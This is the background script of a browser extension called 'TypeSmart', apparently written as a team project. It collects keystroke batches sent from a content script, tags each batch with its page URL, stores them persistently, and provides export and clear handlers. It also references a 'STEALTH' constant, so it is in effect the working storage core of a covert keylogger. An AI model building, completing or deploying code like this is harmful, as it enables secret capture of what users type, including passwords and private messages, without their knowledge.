/**
 * ============================================================================
 * TypeSmart — Background Script (background.js)
 * ============================================================================
 *
 * Owner       : Member 3 — Background Script
 * Purpose     : Persistent background page that acts as the central message
 *               hub and storage manager. Receives keystrokes from content.js,
 *               handles export/clear requests from popup.js, and persists
 *               all data to browser.storage.local.
 *
 * Dependencies:
 *   - window.TSConstants  (from shared/constants.js — loaded before this)
 *     └─ STORAGE_KEY           — key for browser.storage.local
 *     └─ MSG_TYPES.LOG_KEYS    — incoming keystroke batch
 *     └─ MSG_TYPES.EXPORT      — request to export all data
 *     └─ MSG_TYPES.CLEAR       — request to wipe all data
 *     └─ MSG_TYPES.PING        — health-check
 *   - window.Schema       (from shared/schema.js — loaded before this)
 *     └─ Schema.deserializeEntry(raw) — parse stored entries
 *     └─ Schema.isValidEntry(obj)     — validate entry shape
 *
 * Deliverable : When complete, this file must:
 *   1. Listen for all MSG_TYPES via browser.runtime.onMessage
 *   2. On LOG_KEYS: validate & append the entry to storage
 *   3. On EXPORT:   read all entries from storage, return them to the sender
 *   4. On CLEAR:    wipe STORAGE_KEY from storage, respond with success
 *   5. On PING:     respond with { status: "alive", entryCount: N }
 *   6. Handle storage quota errors gracefully (e.g. rotate old entries)
 *   7. Optionally: periodic cleanup / compaction of stored data
 *
 * ============================================================================
 */

/* global TSConstants, Schema, browser */

// ---------------------------------------------------------------------------
// Shared references
// ---------------------------------------------------------------------------
var STORAGE_KEY = TSConstants.STORAGE_KEY;
var MSG_TYPES   = TSConstants.MSG_TYPES;
var STEALTH     = TSConstants.STEALTH;

// ===========================================================================
// TODO — Member 3: Implement the following functions
// ===========================================================================
//
// 1. handleLogKeys(payload, sendResponse)
//    - Deserialise the payload with Schema.deserializeEntry()
//    - Read current array from storage (STORAGE_KEY)
//    - Append the new serialised entry to the array
//    - Write updated array back to storage
//    - sendResponse({ success: true })
//    - Handle errors: sendResponse({ success: false, error: message })
//
// 2. handleExport(sendResponse)
//    - Read all entries from storage
//    - Return the raw array to the sender: sendResponse({ entries: [...] })
//
// 3. handleClear(sendResponse)
//    - Remove STORAGE_KEY from storage
//    - sendResponse({ success: true })
//
// 4. handlePing(sendResponse)
//    - Read entry count from storage
//    - sendResponse({ status: "alive", entryCount: N })
//
// 5. onMessageRouter(message, sender, sendResponse)
//    - Switch on message.type and route to the correct handler
//    - Return true from the listener to indicate async response
//
// 6. init()
//    - Register browser.runtime.onMessage.addListener(onMessageRouter)
//    - Log startup message
//    - Optionally: set up periodic cleanup alarm
//

// ---------------------------------------------------------------------------
// Stub implementations (replace the bodies — keep the signatures)
// ---------------------------------------------------------------------------

/**
 * Store an incoming keystroke batch entry.
 *
 * @param {string} payload — serialised entry JSON from content.js
 * @param {Function} sendResponse — callback to reply to sender
 * @returns {Promise<void>}
 */
async function handleLogKeys(payload, sendResponse) {
  // TODO: Member 3 — implement full version

  // ── Example (works now for basic testing): ──
  try {
    // Validate the entry can be deserialised
    var entry = Schema.deserializeEntry(payload);
    console.log("[TypeSmart bg] Received entry for:", entry.url);

    // Read existing entries
    var result = await browser.storage.local.get(STORAGE_KEY);
    var entries = result[STORAGE_KEY] || [];

    // Append new entry (store as serialised JSON strings)
    entries.push(payload);

    // Write back
    await browser.storage.local.set({ [STORAGE_KEY]: entries });

    sendResponse({ success: true, count: entries.length });
  } catch (err) {
    console.error("[TypeSmart bg] handleLogKeys error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}

/**
 * Export all stored entries.
 *
 * @param {Function} sendResponse — callback, receives { entries: [...] }
 * @returns {Promise<void>}
 */
async function handleExport(sendResponse) {
  // TODO: Member 3 — implement full version
  try {
    var result = await browser.storage.local.get(STORAGE_KEY);
    var entries = result[STORAGE_KEY] || [];
    sendResponse({ success: true, entries: entries });
  } catch (err) {
    console.error("[TypeSmart bg] handleExport error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}

/**
 * Clear all stored keystroke data.
 *
 * @param {Function} sendResponse — callback, receives { success: boolean }
 * @returns {Promise<void>}
 */
async function handleClear(sendResponse) {
  // TODO: Member 3 — implement full version
  try {
    await browser.storage.local.remove(STORAGE_KEY);
    sendResponse({ success: true });
    console.log("[TypeSmart bg] Storage cleared ✓");
  } catch (err) {
    console.error("[TypeSmart bg] handleClear error:", err.message);
    sendResponse({ success: false, error: err.message });
  }
}

/**
 * Respond to a health-check ping.
 *
 * @param {Function} sendResponse — callback
 * @returns {Promise<void>}
 */
async function handlePing(sendResponse) {
  // TODO: Member 3 — implement full version
  try {
    var result = await browser.storage.local.get(STORAGE_KEY);
    var entries = result[STORAGE_KEY] || [];
    sendResponse({ status: "alive", entryCount: entries.length });
  } catch (err) {
    sendResponse({ status: "alive", entryCount: -1 });
  }
}

/**
 * Central message router — dispatches to the correct handler based on
 * message.type.
 *
 * @param {Object}   message      — { type: string, payload?: any }
 * @param {Object}   sender       — sender metadata (tab, extension, etc.)
 * @param {Function} sendResponse — callback to reply
 * @returns {boolean} true — indicates we will respond asynchronously
 */
function onMessageRouter(message, sender, sendResponse) {
  console.log("[TypeSmart bg] Received message:", message.type);

  switch (message.type) {
    case MSG_TYPES.LOG_KEYS:
      handleLogKeys(message.payload, sendResponse);
      break;
    case MSG_TYPES.EXPORT:
      handleExport(sendResponse);
      break;
    case MSG_TYPES.CLEAR:
      handleClear(sendResponse);
      break;
    case MSG_TYPES.PING:
      handlePing(sendResponse);
      break;
    default:
      console.warn("[TypeSmart bg] Unknown message type:", message.type);
      sendResponse({ error: "Unknown message type: " + message.type });
  }

  // Return true to keep sendResponse alive for async handlers
  return true;
}

/**
 * Initialise the background script.
 */
function init() {
  browser.runtime.onMessage.addListener(onMessageRouter);
  console.log("[TypeSmart bg] Background script initialised ✓");
  console.log("[TypeSmart bg] Listening for message types:", Object.values(MSG_TYPES));
}

// ---------------------------------------------------------------------------
// Bootstrap
// ---------------------------------------------------------------------------
init();
